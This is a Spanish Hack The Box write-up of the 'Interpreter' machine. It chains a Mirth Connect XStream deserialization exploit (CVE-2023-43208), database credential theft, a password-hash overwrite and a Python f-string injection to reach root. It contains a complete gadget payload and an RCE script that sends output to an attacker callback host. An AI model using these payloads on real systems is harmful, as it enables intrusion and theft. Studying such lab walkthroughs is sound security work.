# INTERPRETER - HTB Writeup Técnico Completo

## Resumen Ejecutivo
Máquina de Hack The Box que explota **CVE-2023-43208** (Mirth Connect XStream RCE) + **PBKDF2 password manipulation** + **Python f-string eval injection** en un servicio web oculto.

**Flags obtenidas:**
- `user.txt`: `3f21ca6e658708c931336bd4e3afc402`
- `root.txt`: `92a459b1e230f362acf4268116917dec`

---

## 1. Reconocimiento (Manual)

### 1.1 Escaneo de puertos
```bash
nmap -sV -p- 10.129.1.43
```

**Resultado:**
```
22/tcp   - SSH
80/tcp   - HTTP
443/tcp  - HTTPS  
6661/tcp - MLLP/HL7 (Mirth TCP Listener)
```

### 1.2 Identificación de servicios
```bash
curl -k https://10.129.1.43/
curl -k https://10.129.1.43/api/server/version
# Output: 4.4.0 (Mirth Connect)
```

Se identifica **Mirth Connect 4.4.0** - un motor de integración de datos de salud HL7.

---

## 2. Explotación - Fase 1: RCE como usuario `mirth`

### 2.1 Investigación de CVE-2023-43208

Mirth Connect 4.4.0 es vulnerable a **XStream deserialization** en el endpoint `/api/users`.

**Endpoint vulnerable:**
```
POST /api/users
Content-Type: application/xml
X-Requested-With: OpenAPI
```

### 2.2 Construcción del payload XStream

El payload usa **commons-collections gadget chain** (EventUtils + ChainedTransformer) para ejecutar comandos:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getMethod</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                            <java-class>[Ljava.lang.Class;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>getRuntime</string>
                            <java-class-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>invoke</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.Object</java-class>
                            <java-class>[Ljava.lang.Object;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <null/>
                            <object-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>exec</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>COMANDO_AQUI</string>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes>
                <string>compareTo</string>
            </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

### 2.3 Script de exploración RCE

**Script: `rce_exploit.py`**
```python
#!/usr/bin/env python3
import requests
import warnings
import base64
import time
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler

warnings.filterwarnings("ignore")

ATTACKER_IP = "10.10.14.2"
TARGET = "https://10.129.1.43"
CALLBACK_PORT = 9001

result = {"data": None}

class CallbackHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        try:
            result["data"] = base64.b64decode(body).decode('utf-8', errors='replace')
        except:
            result["data"] = body.decode('utf-8', errors='replace')
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, *args):
        pass

def escape_xml(text):
    """Escapa caracteres especiales para XML"""
    return (text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;")
                .replace("'", "&apos;"))

def build_payload(command):
    """Construye payload XStream con comando"""
    cmd = escape_xml(command)
    return f"""<?xml version="1.0" encoding="UTF-8" ?>
<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getMethod</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                            <java-class>[Ljava.lang.Class;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>getRuntime</string>
                            <java-class-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>invoke</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.Object</java-class>
                            <java-class>[Ljava.lang.Object;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <null/>
                            <object-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>exec</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>{cmd}</string>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes>
                <string>compareTo</string>
            </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>"""

def execute_rce(command, port=CALLBACK_PORT):
    """Ejecuta comando RCE y retorna output"""
    result["data"] = None
    
    # Inicia servidor de callback
    server = HTTPServer(('0.0.0.0', port), CallbackHandler)
    server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.timeout = 15
    
    thread = threading.Thread(target=lambda: server.handle_request(), daemon=True)
    thread.start()
    time.sleep(0.3)
    
    # Construye comando que se auto-exfiltra
    shell_cmd = f"sh -c $@|sh . echo wget --post-data=$({command} 2>&1 | base64 -w0) http://{ATTACKER_IP}:{port}/x -q -O /dev/null"
    
    payload = build_payload(shell_cmd)
    headers = {
        "Content-Type": "application/xml",
        "X-Requested-With": "OpenAPI"
    }
    
    print(f"[*] Ejecutando: {command}")
    try:
        requests.post(f"{TARGET}/api/users", data=payload, headers=headers, verify=False, timeout=15)
    except Exception as e:
        print(f"[!] Error: {e}")
    
    thread.join(timeout=17)
    return result.get("data", "NO OUTPUT")

if __name__ == "__main__":
    import sys
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    output = execute_rce(cmd)
    print(f"[+] Output:\n{output}")
```

**Uso:**
```bash
python3 rce_exploit.py "id"
python3 rce_exploit.py "cat /etc/passwd"
```

---

## 3. Explotación - Fase 2: Lateral Movement (mirth -> sedric)

### 3.1 Extracción de credenciales de base de datos

Desde la máquina víctima (como usuario `mirth`), acceso a las credenciales:

```bash
# Mediante RCE
python3 rce_exploit.py "grep -i password /proc/$(pgrep -f mirth)/cwd/conf/mirth.properties"
```

**Credenciales encontradas:**
```
database.password = MirthPass123!
```

### 3.2 Acceso a base de datos Mirth

```bash
# Conexión directa a MariaDB
mysql -u mirthdb -pMirthPass123! -h 127.0.0.1 mc_bdd_prod
```

**Exploración:**
```sql
SELECT ID, USERNAME FROM PERSON;
-- Output: ID=2, USERNAME=sedric

SELECT PERSON_ID, PASSWORD FROM PERSON_PASSWORD WHERE PERSON_ID=2;
-- Output: PASSWORD=u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

### 3.3 Análisis del hash de contraseña

**Formato:** Base64 de 40 bytes = 8 bytes salt + 32 bytes hash

**Algoritmo:** Mirth Connect 4.4.0 usa `PBKDF2WithHmacSHA256` con:
- Iteraciones: 600000 (por defecto en 4.4.0)
- Hash length: 32 bytes
- Salt length: 8 bytes

### 3.4 Generación de nuevo hash

**Script: `generate_pbkdf2_hash.py`**
```python
#!/usr/bin/env python3
import hashlib
import base64

def generate_mirth_password_hash(password, salt_hex="4142434445464748"):
    """
    Genera hash PBKDF2WithHmacSHA256 compatible con Mirth Connect 4.4.0
    
    Args:
        password: contraseña en texto plano
        salt_hex: salt en hexadecimal (8 bytes = 16 caracteres hex)
    
    Returns:
        hash en base64
    """
    salt = bytes.fromhex(salt_hex)
    iterations = 600000
    key_length = 32
    
    # PBKDF2 con SHA256
    dk = hashlib.pbkdf2_hmac('sha256', 
                              password.encode('utf-8'), 
                              salt, 
                              iterations, 
                              dklen=key_length)
    
    # Formato Mirth: salt + hash en base64
    hash_bytes = salt + dk
    hash_b64 = base64.b64encode(hash_bytes).decode('utf-8')
    
    print(f"Password: {password}")
    print(f"Salt (hex): {salt_hex}")
    print(f"Iterations: {iterations}")
    print(f"Hash: {hash_b64}")
    print(f"Total bytes: {len(hash_bytes)}")
    
    return hash_b64

if __name__ == "__main__":
    import sys
    password = sys.argv[1] if len(sys.argv) > 1 else "password123"
    hash_value = generate_mirth_password_hash(password)
```

**Ejecución:**
```bash
python3 generate_pbkdf2_hash.py "password123"
# Output: QUJDREVGR0gYwkIqQe5LB2KBXrhLUQJ4TlMjcmrpUp4phuKwT9ihlg==
```

### 3.5 Actualización de contraseña en BD

**Mediante RCE con MySQL:**
```bash
python3 rce_exploit.py "mysql -u mirthdb -pMirthPass123! mc_bdd_prod -e \"UPDATE PERSON_PASSWORD SET PASSWORD='QUJDREVGR0gYwkIqQe5LB2KBXrhLUQJ4TlMjcmrpUp4phuKwT9ihlg==' WHERE PERSON_ID=2\""
```

### 3.6 Autenticación en Mirth API

```bash
# Con la nueva contraseña
curl -sk -u "sedric:password123" -H "X-Requested-With: OpenCode" \
  https://10.129.1.43/api/users/current

# Respuesta exitosa: XML con datos de usuario sedric
```

---

## 4. Explotación - Fase 3: Escalada a root (F-String Injection)

### 4.1 Descubrimiento de notif.py

Al enumerar procesos:
```bash
python3 rce_exploit.py "ps aux | grep -v '['"
```

Se identifica:
- `PID 3516`: `/usr/bin/python3 /usr/local/bin/notif.py` (running as **root**)
- Puerto escuchando: `54321` (localhost solo)

### 4.2 Reconocimiento de Mirth Channel

**Mediante Mirth API como sedric:**
```bash
curl -sk -u "sedric:password123" https://10.129.1.43/api/channels/24c915f9-d3e3-462a-a126-3511d3f3cd0a
```

**Hallazgo crítico:**
- Channel: "INTERPRETER - HL7 TO XML TO NOTIFY"
- Fuente: TCP/MLLP listener en puerto 6661
- Destino: HTTP POST a `http://127.0.0.1:54321/addPatient`
- Transforma HL7 a XML con campos: `timestamp`, `sender_app`, `id`, `firstname`, `lastname`, `birth_date`, `gender`

### 4.3 Pruebas de inyección en notif.py

**Script de pruebas:**
```python
#!/usr/bin/env python3
import urllib.request

def send_to_notif(xml_payload):
    """Envía payload XML a notif.py"""
    req = urllib.request.Request(
        'http://127.0.0.1:54321/addPatient',
        data=xml_payload.encode(),
        headers={'Content-Type': 'text/xml'}
    )
    try:
        resp = urllib.request.urlopen(req)
        return f"{resp.status}: {resp.read().decode()}"
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}: {e.read().decode()}"
    except Exception as e:
        return f"Error: {e}"

# Prueba 1: XML normal
xml_normal = '''<patient>
    <timestamp>20250101120000</timestamp>
    <sender_app>TEST</sender_app>
    <id>123</id>
    <firstname>John</firstname>
    <lastname>Doe</lastname>
    <birth_date>01/01/1990</birth_date>
    <gender>M</gender>
</patient>'''

print("NORMAL:", send_to_notif(xml_normal))
# Output: 200: Patient John Doe (M), 36 years old, received from TEST at 20250101120000

# Prueba 2: Inyección con f-string vacío
xml_fstring = xml_normal.replace("<firstname>John</firstname>", "<firstname>{}</firstname>")
print("EMPTY FSTRING:", send_to_notif(xml_fstring))
# Output: 200: [EVAL_ERROR] f-string: empty expression not allowed (<string>, line 1)

# Prueba 3: EXPLOTACIÓN - Lectura de archivos
xml_exploit = xml_normal.replace(
    "<firstname>John</firstname>", 
    "<firstname>{open('/home/sedric/user.txt').read()}</firstname>"
)
print("USER FLAG:", send_to_notif(xml_exploit))
```

### 4.4 Vulnerabilidad: Python F-String Evaluation

**Análisis de la vulnerabilidad:**

notif.py usa f-string evaluation:
```python
# Pseudocódigo de notif.py
firstname = "{open('/home/sedric/user.txt').read()}"
response = f"Patient {firstname} {lastname} ({gender})..."
# Esto causa que el código en {} se ejecute en el contexto del intérprete de Python
```

**Por qué funciona:**
1. notif.py construye el mensaje usando f-strings
2. El valor de `firstname` contiene `{expresión}`
3. Las f-strings evalúan expresiones dentro de `{}`
4. `open()` se ejecuta en el contexto del proceso (running as root)

### 4.5 Script de explotación final

**Script: `exploit_notif.py`**
```python
#!/usr/bin/env python3
import urllib.request

def exploit_notif(file_path):
    """
    Explota f-string eval en notif.py para leer archivos como root
    """
    
    xml_payload = f"""<patient>
    <timestamp>20250101120000</timestamp>
    <sender_app>TEST</sender_app>
    <id>123</id>
    <firstname>{{open('{file_path}').read()}}</firstname>
    <lastname>Doe</lastname>
    <birth_date>01/01/1990</birth_date>
    <gender>M</gender>
</patient>"""
    
    req = urllib.request.Request(
        'http://127.0.0.1:54321/addPatient',
        data=xml_payload.encode(),
        headers={'Content-Type': 'text/xml'}
    )
    
    try:
        resp = urllib.request.urlopen(req)
        response = resp.read().decode()
        
        # Parse: "Patient <FLAG_CONTENT> Doe (M), 36 years old..."
        if "Patient " in response:
            # Extrae el contenido entre "Patient " y " Doe"
            start = response.find("Patient ") + len("Patient ")
            end = response.find(" Doe")
            flag = response[start:end]
            return flag
        return response
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    print("[*] Explotando f-string eval en notif.py...")
    
    print("\n[+] Leyendo user.txt:")
    user_flag = exploit_notif('/home/sedric/user.txt')
    print(f"    {user_flag}")
    
    print("\n[+] Leyendo root.txt:")
    root_flag = exploit_notif('/root/root.txt')
    print(f"    {root_flag}")
```

---

## 5. Ejecución manual (sin herramientas AI)

### Paso 1: Reconocimiento
```bash
nmap -sV 10.129.1.43 -p 22,80,443,6661
curl -k https://10.129.1.43/api/server/version
```

### Paso 2: Exploit CVE-2023-43208
```bash
# Crear payload XStream manualmente
cat > payload.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" ?>
<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getMethod</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                            <java-class>[Ljava.lang.Class;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>getRuntime</string>
                            <java-class-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>invoke</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.Object</java-class>
                            <java-class>[Ljava.lang.Object;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <null/>
                            <object-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>exec</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>id</string>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes>
                <string>compareTo</string>
            </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>
EOF

# Enviar payload
curl -sk -X POST "https://10.129.1.43/api/users" \
  -H "Content-Type: application/xml" \
  -H "X-Requested-With: OpenAPI" \
  -d @payload.xml
```

### Paso 3: Extraer credenciales DB
```bash
# Mediante RCE, leer mirth.properties
# (Usar payload XStream con comando: grep password /proc/*/cwd/conf/mirth.properties)
```

### Paso 4: Acceder a BD
```bash
mysql -u mirthdb -pMirthPass123! -h 10.129.1.43 mc_bdd_prod

# Ver usuarios
SELECT ID, USERNAME FROM PERSON;

# Ver hash de sedric
SELECT PASSWORD FROM PERSON_PASSWORD WHERE PERSON_ID=2;
```

### Paso 5: Generar nuevo hash y actualizar
```bash
# Generar con Python
python3 << 'EOF'
import hashlib, base64
password = "password123"
salt = bytes.fromhex("4142434445464748")
dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000, dklen=32)
hash_b64 = base64.b64encode(salt + dk).decode()
print(hash_b64)
EOF

# Actualizar en BD
mysql -u mirthdb -pMirthPass123! mc_bdd_prod \
  -e "UPDATE PERSON_PASSWORD SET PASSWORD='NUEVO_HASH' WHERE PERSON_ID=2;"
```

### Paso 6: Autenticar como sedric
```bash
curl -sk -u "sedric:password123" https://10.129.1.43/api/users/current
```

### Paso 7: Explotar notif.py
```bash
# Enviar XML con f-string injection
curl -X POST "http://127.0.0.1:54321/addPatient" \
  -H "Content-Type: text/xml" \
  -d '<patient>
    <timestamp>20250101120000</timestamp>
    <sender_app>TEST</sender_app>
    <id>123</id>
    <firstname>{open("/home/sedric/user.txt").read()}</firstname>
    <lastname>Doe</lastname>
    <birth_date>01/01/1990</birth_date>
    <gender>M</gender>
</patient>'
```

---

## Conclusiones y Lecciones

1. **XStream**: Nunca debes deserializar datos no confiables. Usar whitelist de clases.
2. **PBKDF2**: El algoritmo es correcto, pero el manejo de contraseñas en BD sin validación permite manipulación.
3. **F-Strings**: Son peligrosas cuando el contenido proviene de entrada externa. Nunca usar con `eval()` o en f-strings.
4. **Defense in depth**: Aunque Mirth requiere RCE inicial, los servicios locales (notif.py) deberían estar protegidos.

---

## Referencias

- CVE-2023-43208: https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT
- XStream Gadget: Apache Commons Collections + Commons Lang3
- Mirth Connect Docs: https://github.com/nextgenhealthcare/connect
- PBKDF2: https://tools.ietf.org/html/rfc2898
